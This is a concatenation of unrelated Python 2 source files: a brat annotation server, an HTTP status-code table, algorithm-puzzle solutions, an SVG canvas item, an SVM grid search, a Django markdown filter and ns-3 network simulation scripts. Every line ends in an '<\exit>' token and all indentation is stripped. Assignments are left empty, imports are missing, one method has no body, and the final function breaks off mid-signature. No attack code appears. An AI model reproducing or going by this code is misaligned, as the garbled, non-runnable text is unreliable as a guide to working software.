from cgi import FieldStorage<\exit>
from BaseHTTPServer import HTTPServer<\exit>
from SimpleHTTPServer import SimpleHTTPRequestHandler<\exit>
from SocketServer import ForkingMixIn<\exit>
import socket<\exit>
sys.path.append(os.path.join(os.path.dirname(__file__), 'server/src'))<\exit>
from server import serve<\exit>
import annlog<\exit>
import annotation<\exit>
import annotator<\exit>
import auth<\exit>
import common<\exit>
import delete<\exit>
import dispatch<\exit>
import docimport<\exit>
import document<\exit>
import download<\exit>
import filelock<\exit>
import gtbtokenize<\exit>
import jsonwrap<\exit>
import message<\exit>
import normdb<\exit>
import norm<\exit>
import predict<\exit>
import projectconfig<\exit>
import realmessage<\exit>
import sdistance<\exit>
import search<\exit>
import server<\exit>
import session<\exit>
import simstringdb<\exit>
import sosmessage<\exit>
import ssplit<\exit>
import sspostproc<\exit>
import stats<\exit>
import svg<\exit>
import tag<\exit>
import tokenise<\exit>
import undo<\exit>
import verify_annotations<\exit>
_VERBOSE_HANDLER = False<\exit>
_DEFAULT_SERVER_ADDR = ''<\exit>
_DEFAULT_SERVER_PORT = 8001<\exit>
_PERMISSIONS =<\exit>
class PermissionParseError(Exception):<\exit>
def __init__(self, linenum, line, message=None):<\exit>
self.linenum = linenum<\exit>
self.line = line<\exit>
self.message = ' (%s)' % message if message is not None else ''<\exit>
def __str__(self):<\exit>
return 'line %d%s: %s' % (self.linenum, self.message, self.line)<\exit>
class PathPattern(object):<\exit>
def __init__(self, path):<\exit>
self.path = path<\exit>
self.plen = len(path)<\exit>
def match(self, s):<\exit>
return s[:self.plen] == self.path and (self.path[-1] == '/' or<\exit>
s[self.plen:] == '' or<\exit>
s[self.plen] == '/')<\exit>
class ExtensionPattern(object):<\exit>
def __init__(self, ext):<\exit>
self.ext = ext<\exit>
def match(self, s):<\exit>
return os.path.splitext(s)[1] == self.ext<\exit>
class PathPermissions(object):<\exit>
def __init__(self, default_allow=False):<\exit>
self._entries = []<\exit>
self.default_allow = default_allow<\exit>
def allow(self, path):<\exit>
for pattern, allow in self._entries:<\exit>
if pattern.match(path):<\exit>
return allow<\exit>
return self.default_allow<\exit>
def parse(self, lines):<\exit>
for ln, l in enumerate(lines):<\exit>
i = l.find('#')<\exit>
if i != -1:<\exit>
l = l[:i]<\exit>
l = l.strip()<\exit>
if not l:<\exit>
continue<\exit>
i = l.find(':')<\exit>
if i == -1:<\exit>
raise PermissionParseError(ln, lines[ln], 'missing colon')<\exit>
directive = l[:i].strip().lower()<\exit>
pattern = l[i+1:].strip()<\exit>
if directive == 'allow':<\exit>
allow = True<\exit>
elif directive == 'disallow':<\exit>
allow = False<\exit>
else:<\exit>
raise PermissionParseError(ln, lines[ln], 'unrecognized directive')<\exit>
if pattern.startswith('/'):<\exit>
patt = PathPattern(pattern)<\exit>
elif pattern.startswith('*.'):<\exit>
patt = ExtensionPattern(pattern[1:])<\exit>
else:<\exit>
raise PermissionParseError(ln, lines[ln], 'unrecognized pattern')<\exit>
self._entries.append((patt, allow))<\exit>
return self<\exit>
class BratHTTPRequestHandler(SimpleHTTPRequestHandler):<\exit>
permissions = PathPermissions().parse(_PERMISSIONS.split('\n'))<\exit>
def log_request(self, code='-', size='-'):<\exit>
if _VERBOSE_HANDLER:<\exit>
SimpleHTTPRequestHandler.log_request(self, code, size)<\exit>
else:<\exit>
pass<\exit>
def is_brat(self):<\exit>
path = self.path<\exit>
path = path.split('?', 1)[0]<\exit>
path = path.split('#', 1)[0]<\exit>
if path == '/ajax.cgi':<\exit>
return True<\exit>
else:<\exit>
return False<\exit>
def run_brat_direct(self):<\exit>
remote_addr = self.client_address[0]<\exit>
remote_host = self.address_string()<\exit>
cookie_data = ', '.join(filter(None, self.headers.getheaders('cookie')))<\exit>
query_string = ''<\exit>
i = self.path.find('?')<\exit>
if i != -1:<\exit>
query_string = self.path[i+1:]<\exit>
saved = sys.stdin, sys.stdout, sys.stderr<\exit>
sys.stdin, sys.stdout = self.rfile, self.wfile<\exit>
env = {}<\exit>
env['REQUEST_METHOD'] = self.command<\exit>
content_length = self.headers.getheader('content-length')<\exit>
if content_length:<\exit>
env['CONTENT_LENGTH'] = content_length<\exit>
if query_string:<\exit>
env['QUERY_STRING'] = query_string<\exit>
os.environ.update(env)<\exit>
params = FieldStorage()<\exit>
cookie_hdrs, response_data = serve(params, remote_addr, remote_host,<\exit>
cookie_data)<\exit>
sys.stdin, sys.stdout, sys.stderr = saved<\exit>
if cookie_hdrs is not None:<\exit>
response_hdrs = [hdr for hdr in cookie_hdrs]<\exit>
else:<\exit>
response_hdrs = []<\exit>
response_hdrs.extend(response_data[0])<\exit>
self.send_response(200)<\exit>
self.wfile.write('\n'.join('%s: %s' % (k, v) for k, v in response_hdrs))<\exit>
self.wfile.write('\n')<\exit>
self.wfile.write('\n')<\exit>
if isinstance(response_data[1], unicode):<\exit>
self.wfile.write(response_data[1].encode('utf-8'))<\exit>
else:<\exit>
self.wfile.write(response_data[1])<\exit>
return 0<\exit>
def allow_path(self):<\exit>
path = self.path<\exit>
path = path.split('?', 1)[0]<\exit>
path = path.split('#', 1)[0]<\exit>
path = unquote(path)<\exit>
path = normpath(path)<\exit>
parts = path.split('/')<\exit>
parts = filter(None, parts)<\exit>
if '..' in parts:<\exit>
return False<\exit>
path = '/'+'/'.join(parts)<\exit>
return self.permissions.allow(path)<\exit>
def list_directory(self, path):<\exit>
self.send_error(403)<\exit>
def do_POST(self):<\exit>
if self.is_brat():<\exit>
self.run_brat_direct()<\exit>
else:<\exit>
self.send_error(501, "Can only POST to brat")<\exit>
def do_GET(self):<\exit>
if not self.allow_path():<\exit>
self.send_error(403)<\exit>
elif self.is_brat():<\exit>
self.run_brat_direct()<\exit>
else:<\exit>
SimpleHTTPRequestHandler.do_GET(self)<\exit>
def do_HEAD(self):<\exit>
if not self.allow_path():<\exit>
self.send_error(403)<\exit>
else:<\exit>
SimpleHTTPRequestHandler.do_HEAD(self)<\exit>
class BratServer(ForkingMixIn, HTTPServer):<\exit>
def __init__(self, server_address):<\exit>
HTTPServer.__init__(self, server_address, BratHTTPRequestHandler)<\exit>
def main(argv):<\exit>
try:<\exit>
if os.getuid() == 0:<\exit>
print >> sys.stderr,<\exit>
except AttributeError:<\exit>
print >> sys.stderr,<\exit>
if len(argv) > 1:<\exit>
try:<\exit>
port = int(argv[1])<\exit>
except ValueError:<\exit>
print >> sys.stderr, "Failed to parse", argv[1], "as port number."<\exit>
return 1<\exit>
else:<\exit>
port = _DEFAULT_SERVER_PORT<\exit>
try:<\exit>
server = BratServer((_DEFAULT_SERVER_ADDR, port))<\exit>
print >> sys.stderr, "Serving brat at http://%s:%d" % server.server_address<\exit>
server.serve_forever()<\exit>
except KeyboardInterrupt:<\exit>
pass<\exit>
except socket.error, why:<\exit>
print >> sys.stderr, "Error binding to port", port, ":", why[1]<\exit>
except Exception, e:<\exit>
print >> sys.stderr, "Server error", e<\exit>
raise<\exit>
return 0<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
from .structures import LookupDict<\exit>
_codes = {<\exit>
100: ('continue',),<\exit>
101: ('switching_protocols',),<\exit>
102: ('processing',),<\exit>
103: ('checkpoint',),<\exit>
122: ('uri_too_long', 'request_uri_too_long'),<\exit>
200: ('ok', 'okay', 'all_ok', 'all_okay', 'all_good', '\\o/', ''),<\exit>
201: ('created',),<\exit>
202: ('accepted',),<\exit>
203: ('non_authoritative_info', 'non_authoritative_information'),<\exit>
204: ('no_content',),<\exit>
205: ('reset_content', 'reset'),<\exit>
206: ('partial_content', 'partial'),<\exit>
207: ('multi_status', 'multiple_status', 'multi_stati', 'multiple_stati'),<\exit>
208: ('im_used',),<\exit>
300: ('multiple_choices',),<\exit>
301: ('moved_permanently', 'moved', '\\o-'),<\exit>
302: ('found',),<\exit>
303: ('see_other', 'other'),<\exit>
304: ('not_modified',),<\exit>
305: ('use_proxy',),<\exit>
306: ('switch_proxy',),<\exit>
307: ('temporary_redirect', 'temporary_moved', 'temporary'),<\exit>
308: ('resume_incomplete', 'resume'),<\exit>
400: ('bad_request', 'bad'),<\exit>
401: ('unauthorized',),<\exit>
402: ('payment_required', 'payment'),<\exit>
403: ('forbidden',),<\exit>
404: ('not_found', '-o-'),<\exit>
405: ('method_not_allowed', 'not_allowed'),<\exit>
406: ('not_acceptable',),<\exit>
407: ('proxy_authentication_required', 'proxy_auth', 'proxy_authentication'),<\exit>
408: ('request_timeout', 'timeout'),<\exit>
409: ('conflict',),<\exit>
410: ('gone',),<\exit>
411: ('length_required',),<\exit>
412: ('precondition_failed', 'precondition'),<\exit>
413: ('request_entity_too_large',),<\exit>
414: ('request_uri_too_large',),<\exit>
415: ('unsupported_media_type', 'unsupported_media', 'media_type'),<\exit>
416: ('requested_range_not_satisfiable', 'requested_range', 'range_not_satisfiable'),<\exit>
417: ('expectation_failed',),<\exit>
418: ('im_a_teapot', 'teapot', 'i_am_a_teapot'),<\exit>
422: ('unprocessable_entity', 'unprocessable'),<\exit>
423: ('locked',),<\exit>
424: ('failed_dependency', 'dependency'),<\exit>
425: ('unordered_collection', 'unordered'),<\exit>
426: ('upgrade_required', 'upgrade'),<\exit>
428: ('precondition_required', 'precondition'),<\exit>
429: ('too_many_requests', 'too_many'),<\exit>
431: ('header_fields_too_large', 'fields_too_large'),<\exit>
444: ('no_response', 'none'),<\exit>
449: ('retry_with', 'retry'),<\exit>
450: ('blocked_by_windows_parental_controls', 'parental_controls'),<\exit>
499: ('client_closed_request',),<\exit>
500: ('internal_server_error', 'server_error', '/o\\', ''),<\exit>
501: ('not_implemented',),<\exit>
502: ('bad_gateway',),<\exit>
503: ('service_unavailable', 'unavailable'),<\exit>
504: ('gateway_timeout',),<\exit>
505: ('http_version_not_supported', 'http_version'),<\exit>
506: ('variant_also_negotiates',),<\exit>
507: ('insufficient_storage',),<\exit>
509: ('bandwidth_limit_exceeded', 'bandwidth'),<\exit>
510: ('not_extended',),<\exit>
}<\exit>
codes = LookupDict(name='status_codes')<\exit>
for (code, titles) in list(_codes.items()):<\exit>
for title in titles:<\exit>
setattr(codes, title, code)<\exit>
if not title.startswith('\\'):<\exit>
setattr(codes, title.upper(), code)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, A = cipher<\exit>
f = [0 for _ in A]<\exit>
f[N - 1] = A[N - 1]<\exit>
for i in xrange(N - 2, -1, -1):<\exit>
f[i] = max(A[i], f[i + 1])<\exit>
profit = 0<\exit>
for i in xrange(N - 1):<\exit>
profit += max(0, f[i + 1] - A[i])<\exit>
return profit<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
N = int(f.readline().strip())<\exit>
A = map(int, f.readline().strip().split(' '))<\exit>
cipher = N, A<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
r, c = cipher<\exit>
r, c = r - 1, c - 1<\exit>
return r / 2 * 10 + r % 2 + c * 2<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
def longest(word_set, cache, word):<\exit>
if word not in cache:<\exit>
ret = 1<\exit>
for i in xrange(len(word)):<\exit>
w = word[:i] + word[i+1:]<\exit>
if w and w in word_set:<\exit>
cnt = longest(word_set, cache, w)<\exit>
ret = max(ret, 1 + cnt)<\exit>
cache[word] = ret<\exit>
return cache[word]<\exit>
def longestChain(words):<\exit>
cache = {}<\exit>
word_set = set(words)<\exit>
gmax = 0<\exit>
for word in words:<\exit>
gmax = max(gmax, longest(word_set, cache, word))<\exit>
return gmax<\exit>
if __name__ == "__main__":<\exit>
words = ["a", "b", "ba", "bca", "bda", "bdca"]<\exit>
assert longestChain(words) == 4<\exit>
class CaseInsensitiveDict(dict):<\exit>
@property<\exit>
def lower_keys(self):<\exit>
if not hasattr(self, '_lower_keys') or not self._lower_keys:<\exit>
self._lower_keys = dict((k.lower(), k) for k in list(self.keys()))<\exit>
return self._lower_keys<\exit>
def _clear_lower_keys(self):<\exit>
if hasattr(self, '_lower_keys'):<\exit>
self._lower_keys.clear()<\exit>
def __setitem__(self, key, value):<\exit>
dict.__setitem__(self, key, value)<\exit>
self._clear_lower_keys()<\exit>
def __delitem__(self, key):<\exit>
dict.__delitem__(self, self.lower_keys.get(key.lower(), key))<\exit>
self._lower_keys.clear()<\exit>
def __contains__(self, key):<\exit>
return key.lower() in self.lower_keys<\exit>
def __getitem__(self, key):<\exit>
if key in self:<\exit>
return dict.__getitem__(self, self.lower_keys[key.lower()])<\exit>
def get(self, key, default=None):<\exit>
if key in self:<\exit>
return self[key]<\exit>
else:<\exit>
return default<\exit>
class LookupDict(dict):<\exit>
def __init__(self, name=None):<\exit>
self.name = name<\exit>
super(LookupDict, self).__init__()<\exit>
def __repr__(self):<\exit>
return '<lookup \'%s\'>' % (self.name)<\exit>
def __getitem__(self, key):<\exit>
return self.__dict__.get(key, None)<\exit>
def get(self, key, default=None):<\exit>
return self.__dict__.get(key, default)<\exit>
from bisect import bisect_left, bisect_right<\exit>
class Solution:<\exit>
def subarraySumII(self, A, start, end):<\exit>
n = len(A)<\exit>
cnt = 0<\exit>
f = [0 for _ in xrange(n+1)]<\exit>
for i in xrange(1, n+1):<\exit>
f[i] = f[i-1]+A[i-1]<\exit>
f.sort()<\exit>
for i in xrange(n+1):<\exit>
lo = bisect_left(f, f[i]-end, 0, i)<\exit>
hi = bisect_right(f, f[i]-start, 0, i)<\exit>
cnt += hi-lo<\exit>
return cnt<\exit>
def subarraySumII_TLE(self, A, start, end):<\exit>
n = len(A)<\exit>
cnt = 0<\exit>
f = [0 for _ in xrange(n+1)]<\exit>
for i in xrange(1, n+1):<\exit>
f[i] = f[i-1]+A[i-1]<\exit>
for i in xrange(0, n+1):<\exit>
for j in xrange(i+1, n+1):<\exit>
s = f[j]-f[i]<\exit>
if start <= s <= end:<\exit>
cnt += 1<\exit>
return cnt<\exit>
if __name__ == "__main__":<\exit>
assert Solution().subarraySumII([1, 2, 3, 4], 1, 3) == 4<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def subarraySum(self, nums):<\exit>
n = len(nums)<\exit>
f = [0 for _ in xrange(n+1)]<\exit>
for i in xrange(1, n+1):<\exit>
f[i] = f[i-1]+nums[i-1]<\exit>
d = defaultdict(list)<\exit>
for i in xrange(1, n+1):<\exit>
d[f[i]].append(i)<\exit>
for k, v in d.items():<\exit>
if k == 0:<\exit>
return [0, v[0]-1]<\exit>
if len(v) > 1:<\exit>
return [v[0], v[1]-1]<\exit>
return [-1, -1]<\exit>
if __name__ == "__main__":<\exit>
print Solution().subarraySum([-5, 10, 5, -3, 1, 1, 1, -2, 3, -4])<\exit>
class Solution:<\exit>
def submatrixSum(self, matrix):<\exit>
m = len(matrix)<\exit>
n = len(matrix[0])<\exit>
to_top = [[0 for _ in xrange(n+1)] for _ in xrange(m+1)]<\exit>
for i in xrange(1, m+1):<\exit>
for j in xrange(1, n+1):<\exit>
to_top[i][j] = to_top[i-1][j] + matrix[i-1][j-1]<\exit>
for up in xrange(m):<\exit>
for down in xrange(up, m):<\exit>
h = {}<\exit>
s = 0<\exit>
h[s] = -1<\exit>
for j in xrange(n):<\exit>
s += to_top[down+1][j+1] - to_top[up][j+1]<\exit>
if s in h:<\exit>
return [[up, h[s]+1], [down, j]]<\exit>
h[s] = j<\exit>
return [[-1, -1], [-1, -1]]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().submatrixSum([<\exit>
[1, 5, 7],<\exit>
[3, 7, -8],<\exit>
[4, -8, 9],<\exit>
]) == [[1, 1], [2, 2]]<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
S, p, q = cipher<\exit>
n = len(p)<\exit>
S = int(S)<\exit>
global_max = 0<\exit>
for i in xrange(n):<\exit>
global_max = max(global_max, self.get_longest(S, p, q, i, 0), self.get_longest(S, p, q, 0, i))<\exit>
return global_max<\exit>
def get_longest(self, S, p, q, i, j):<\exit>
start_i = i<\exit>
start_j = j<\exit>
local_max = 0<\exit>
n = len(p)<\exit>
cur_diff = 0<\exit>
while i < n and j < n:<\exit>
if p[i] != q[j]:<\exit>
cur_diff += 1<\exit>
if cur_diff > S:<\exit>
while p[start_i] == q[start_j]:<\exit>
start_i += 1<\exit>
start_j += 1<\exit>
start_i += 1<\exit>
start_j += 1<\exit>
cur_diff -= 1<\exit>
local_max = max(local_max, i - start_i + 1)<\exit>
i += 1<\exit>
j += 1<\exit>
return local_max<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = f.readline().strip().split(' ')<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
import gobject<\exit>
import rsvg<\exit>
import goocanvas<\exit>
import os.path<\exit>
class SvgItem(goocanvas.ItemSimple):<\exit>
__gproperties__ = {<\exit>
'x': (float,<\exit>
'X',<\exit>
'The x coordinate of a SVG image',<\exit>
-10e6,<\exit>
10e6,<\exit>
0,<\exit>
gobject.PARAM_READWRITE),<\exit>
'y': (float,<\exit>
'Y',<\exit>
'The y coordinate of a SVG image',<\exit>
-10e6,<\exit>
10e6,<\exit>
0,<\exit>
gobject.PARAM_READWRITE),<\exit>
'width': (float,<\exit>
'Width',<\exit>
'The width of the SVG Image',<\exit>
0,<\exit>
10e6,<\exit>
0,<\exit>
gobject.PARAM_READWRITE),<\exit>
'height': (float,<\exit>
'Height',<\exit>
'The width of the SVG Image',<\exit>
0,<\exit>
10e6,<\exit>
0,<\exit>
gobject.PARAM_READWRITE),<\exit>
}<\exit>
def __init__(self, x, y, rsvg_handle, **kwargs):<\exit>
super(SvgItem, self).__init__(**kwargs)<\exit>
assert isinstance(rsvg_handle, rsvg.Handle)<\exit>
self.x = x<\exit>
self.y = y<\exit>
self.sx = 1.0<\exit>
self.sy = 1.0<\exit>
self.handle = rsvg_handle<\exit>
self.width = self.handle.props.width<\exit>
self.height = self.handle.props.height<\exit>
self.custom_width = None<\exit>
self.custom_height = None<\exit>
def do_set_property(self, pspec, value):<\exit>
if pspec.name == 'x':<\exit>
self.x = value<\exit>
self.changed(True)<\exit>
elif pspec.name == 'y':<\exit>
self.y = value<\exit>
self.changed(True)<\exit>
elif pspec.name == 'width':<\exit>
self.custom_width = value<\exit>
self._size_changed()<\exit>
self.changed(True)<\exit>
elif pspec.name == 'height':<\exit>
self.custom_height = value<\exit>
self._size_changed()<\exit>
self.changed(True)<\exit>
else:<\exit>
raise AttributeError, 'unknown property %s' % pspec.name<\exit>
def _size_changed(self):<\exit>
if self.custom_width is None and self.custom_height is None:<\exit>
self.width = self.handle.props.width<\exit>
self.height = self.handle.props.height<\exit>
self.sx = 1.0<\exit>
self.sy = 1.0<\exit>
elif self.custom_width is not None and self.custom_height is None:<\exit>
self.width = self.custom_width<\exit>
self.sx = self.custom_width / self.handle.props.width<\exit>
self.sy = self.sx<\exit>
self.height = self.handle.props.height*self.sy<\exit>
elif self.custom_width is None and self.custom_height is not None:<\exit>
self.height = self.custom_height<\exit>
self.sy = self.custom_height / self.handle.props.height<\exit>
self.sx  = self.sy<\exit>
self.width = self.handle.props.width*self.sx<\exit>
else:<\exit>
self.width = self.custom_width<\exit>
self.height = self.custom_height<\exit>
self.sx = self.custom_width / self.handle.props.width<\exit>
self.sy = self.custom_height / self.handle.props.height<\exit>
def do_get_property(self, pspec):<\exit>
if pspec.name == 'x':<\exit>
return self.x<\exit>
elif pspec.name == 'y':<\exit>
return self.y<\exit>
elif pspec.name == 'width':<\exit>
self.width = self.handle.props.width<\exit>
self.height = self.handle.props.height<\exit>
return self.width<\exit>
elif pspec.name == 'height':<\exit>
return self.height<\exit>
else:<\exit>
raise AttributeError, 'unknown property %s' % pspec.name<\exit>
def do_simple_paint(self, cr, bounds):<\exit>
cr.translate(self.x, self.y)<\exit>
cr.scale(self.sx, self.sy)<\exit>
self.handle.render_cairo(cr)<\exit>
def do_simple_update(self, cr):<\exit>
self.bounds_x1 = float(self.x)<\exit>
self.bounds_y1 = float(self.y)<\exit>
self.bounds_x2 = float(self.x + self.width)<\exit>
self.bounds_y2 = float(self.y + self.height)<\exit>
def do_simple_is_item_at(self, x, y, cr, is_pointer_event):<\exit>
if ((x < self.x) or (x > self.x + self.width)) or ((y < self.y) or (y > self.y + self.height)):<\exit>
return False<\exit>
else:<\exit>
return True<\exit>
_rsvg_cache = dict()<\exit>
def rsvg_handle_factory(base_file_name):<\exit>
try:<\exit>
return _rsvg_cache[base_file_name]<\exit>
except KeyError:<\exit>
full_path = os.path.join(os.path.dirname(__file__), 'resource', base_file_name)<\exit>
rsvg_handle = rsvg.Handle(full_path)<\exit>
_rsvg_cache[base_file_name] = rsvg_handle<\exit>
return rsvg_handle<\exit>
from facerec_py.facerec.classifier import SVM<\exit>
from facerec_py.facerec.validation import KFoldCrossValidation<\exit>
from facerec_py.facerec.model import PredictableModel<\exit>
from svmutil import *<\exit>
from itertools import product<\exit>
import numpy as np<\exit>
import logging<\exit>
def range_f(begin, end, step):<\exit>
seq = []<\exit>
while True:<\exit>
if step == 0: break<\exit>
if step > 0 and begin > end: break<\exit>
if step < 0 and begin < end: break<\exit>
seq.append(begin)<\exit>
begin = begin + step<\exit>
return seq<\exit>
def grid(grid_parameters):<\exit>
grid = []<\exit>
for parameter in grid_parameters:<\exit>
begin, end, step = parameter<\exit>
grid.append(range_f(begin, end, step))<\exit>
return product(*grid)<\exit>
def grid_search(model, X, y, C_range=(-5,  15, 2), gamma_range=(3, -15, -2), k=5, num_cores=1):<\exit>
if not isinstance(model, PredictableModel):<\exit>
raise TypeError("GridSearch expects a PredictableModel. If you want to perform optimization on raw data use facerec.feature.Identity to pass unpreprocessed data!")<\exit>
if not isinstance(model.classifier, SVM):<\exit>
raise TypeError("GridSearch expects a SVM as classifier. Please use a facerec.classifier.SVM!")<\exit>
logger = logging.getLogger("facerec.svm.gridsearch")<\exit>
logger.info("Performing a Grid Search.")<\exit>
best_parameter = svm_parameter("-q")<\exit>
best_parameter.kernel_type = model.classifier.param.kernel_type<\exit>
best_parameter.nu = model.classifier.param.nu<\exit>
best_parameter.coef0 = model.classifier.param.coef0<\exit>
if (gamma_range is None) or (model.classifier.param.kernel_type == LINEAR):<\exit>
gamma_range = (0, 0, 1)<\exit>
best_accuracy = np.finfo('float').min<\exit>
g = grid([C_range, gamma_range])<\exit>
results = []<\exit>
for p in g:<\exit>
C, gamma = p<\exit>
C, gamma = 2**C, 2**gamma<\exit>
model.classifier.param.C, model.classifier.param.gamma = C, gamma<\exit>
cv = KFoldCrossValidation(model=model,k=k)<\exit>
cv.validate(X,y)<\exit>
results.append([C, gamma, cv.accuracy])<\exit>
if cv.accuracy > best_accuracy:<\exit>
logger.info("best_accuracy=%s" % (cv.accuracy))<\exit>
best_accuracy = cv.accuracy<\exit>
best_parameter.C, best_parameter.gamma = C, gamma<\exit>
logger.info("%d-CV Result = %.2f." % (k, cv.accuracy))<\exit>
return best_parameter, results<\exit>
from django import template<\exit>
import markdown2<\exit>
register = template.Library()<\exit>
@register.simple_tag(takes_context=True)<\exit>
def some_tags(context):<\exit>
pass<\exit>
@register.filter<\exit>
def markdownify(text):<\exit>
return markdown2.markdown(text, extras=["fenced-code-blocks"], safe_mode=None)<\exit>
import sys<\exit>
import ns.core<\exit>
import ns.csma<\exit>
import ns.internet<\exit>
import ns.network<\exit>
import ns.tap_bridge<\exit>
def main(argv):<\exit>
ns.core.GlobalValue.Bind("SimulatorImplementationType", ns.core.StringValue("ns3::RealtimeSimulatorImpl"))<\exit>
ns.core.GlobalValue.Bind("ChecksumEnabled", ns.core.BooleanValue("true"))<\exit>
nodes = ns.network.NodeContainer()<\exit>
nodes.Create (2)<\exit>
csma = ns.csma.CsmaHelper()<\exit>
devices = csma.Install(nodes)<\exit>
tapBridge = ns.tap_bridge.TapBridgeHelper()<\exit>
tapBridge.SetAttribute ("Mode", ns.core.StringValue ("UseLocal"))<\exit>
tapBridge.SetAttribute ("DeviceName", ns.core.StringValue ("tap-left"))<\exit>
tapBridge.Install (nodes.Get (0), devices.Get (0))<\exit>
tapBridge.SetAttribute ("DeviceName", ns.core.StringValue ("tap-right"))<\exit>
tapBridge.Install (nodes.Get (1), devices.Get (1))<\exit>
ns.core.Simulator.Stop (ns.core.Seconds (600))<\exit>
ns.core.Simulator.Run(signal_check_frequency = -1)<\exit>
ns.core.Simulator.Destroy()<\exit>
return 0<\exit>
if __name__ == '__main__':<\exit>
sys.exit(main(sys.argv))<\exit>
import sys<\exit>
import ns.core<\exit>
import ns.internet<\exit>
import ns.mobility<\exit>
import ns.network<\exit>
import ns.tap_bridge<\exit>
import ns.wifi<\exit>
def main(argv):<\exit>
ns.core.GlobalValue.Bind("SimulatorImplementationType", ns.core.StringValue("ns3::RealtimeSimulatorImpl"))<\exit>
ns.core.GlobalValue.Bind("ChecksumEnabled", ns.core.BooleanValue("true"))<\exit>
nodes = ns.network.NodeContainer()<\exit>
nodes.Create (2);<\exit>
wifi = ns.wifi.WifiHelper.Default()<\exit>
wifi.SetStandard (ns.wifi.WIFI_PHY_STANDARD_80211a);<\exit>
wifi.SetRemoteStationManager ("ns3::ConstantRateWifiManager", "DataMode", ns.core.StringValue ("OfdmRate54Mbps"));<\exit>
wifiMac = ns.wifi.NqosWifiMacHelper.Default()<\exit>
wifiMac.SetType ("ns3::AdhocWifiMac");<\exit>
wifiChannel = ns.wifi.YansWifiChannelHelper.Default()<\exit>
wifiPhy = ns.wifi.YansWifiPhyHelper.Default()<\exit>
wifiPhy.SetChannel(wifiChannel.Create())<\exit>
devices = wifi.Install(wifiPhy, wifiMac, nodes)<\exit>
mobility = ns.mobility.MobilityHelper()<\exit>
positionAlloc = ns.mobility.ListPositionAllocator()<\exit>
positionAlloc.Add(ns.core.Vector(0.0, 0.0, 0.0))<\exit>
positionAlloc.Add(ns.core.Vector(5.0, 0.0, 0.0))<\exit>
mobility.SetPositionAllocator(positionAlloc)<\exit>
mobility.SetMobilityModel ("ns3::ConstantPositionMobilityModel")<\exit>
mobility.Install(nodes)<\exit>
tapBridge = ns.tap_bridge.TapBridgeHelper()<\exit>
tapBridge.SetAttribute ("Mode", ns.core.StringValue ("UseLocal"));<\exit>
tapBridge.SetAttribute ("DeviceName", ns.core.StringValue ("tap-left"));<\exit>
tapBridge.Install (nodes.Get (0), devices.Get (0));<\exit>
tapBridge.SetAttribute ("DeviceName", ns.core.StringValue ("tap-right"));<\exit>
tapBridge.Install (nodes.Get (1), devices.Get (1));<\exit>
ns.core.Simulator.Stop (ns.core.Seconds (600));<\exit>
ns.core.Simulator.Run(signal_check_frequency = -1)<\exit>
ns.core.Simulator.Destroy()<\exit>
return 0<\exit>
if __name__ == '__main__':<\exit>
sys.exit(main(sys.argv))<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
tasks = cipher<\exit>
tasks.sort(key=lambda t: t[0])<\exit>
overshot = -1<\exit>
timer = 0<\exit>
for task in tasks:<\exit>
timer += task[1]<\exit>
overshot = max(overshot, timer - task[0])<\exit>
return overshot<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
cipher = []<\exit>
for t in xrange(testcases):<\exit>
cipher.append(map(lambda x: int(x), f.readline().strip().split(' ')))<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
import os<\exit>
import sys<\exit>
import time<\exit>
import optparse<\exit>
import subprocess<\exit>
import threading<\exit>
import Queue<\exit>
import signal<\exit>
import xml.dom.minidom<\exit>
import shutil<\exit>
import re<\exit>
from utils import get_list_from_file<\exit>
interesting_config_items = [<\exit>
"NS3_ENABLED_MODULES",<\exit>
"NS3_MODULE_PATH",<\exit>
"NSC_ENABLED",<\exit>
"ENABLE_REAL_TIME",<\exit>
"ENABLE_THREADING",<\exit>
"ENABLE_EXAMPLES",<\exit>
"ENABLE_TESTS",<\exit>
"EXAMPLE_DIRECTORIES",<\exit>
"ENABLE_PYTHON_BINDINGS",<\exit>
"ENABLE_CLICK",<\exit>
"ENABLE_OPENFLOW",<\exit>
]<\exit>
NSC_ENABLED = False<\exit>
ENABLE_REAL_TIME = False<\exit>
ENABLE_THREADING = False<\exit>
ENABLE_EXAMPLES = True<\exit>
ENABLE_TESTS = True<\exit>
ENABLE_CLICK = False<\exit>
ENABLE_OPENFLOW = False<\exit>
EXAMPLE_DIRECTORIES = []<\exit>
core_kinds = ["bvt", "core", "system", "unit"]<\exit>
core_valgrind_skip_tests = [<\exit>
"ns3-tcp-cwnd",<\exit>
"nsc-tcp-loss",<\exit>
"ns3-tcp-interoperability",<\exit>
"routing-click",<\exit>
]<\exit>
core_nsc_missing_skip_tests = [<\exit>
"ns3-tcp-cwnd",<\exit>
"nsc-tcp-loss",<\exit>
"ns3-tcp-interoperability",<\exit>
]<\exit>
def parse_examples_to_run_file(<\exit>
examples_to_run_path,<\exit>
cpp_executable_dir,<\exit>
python_script_dir,<\exit>
example_tests,<\exit>
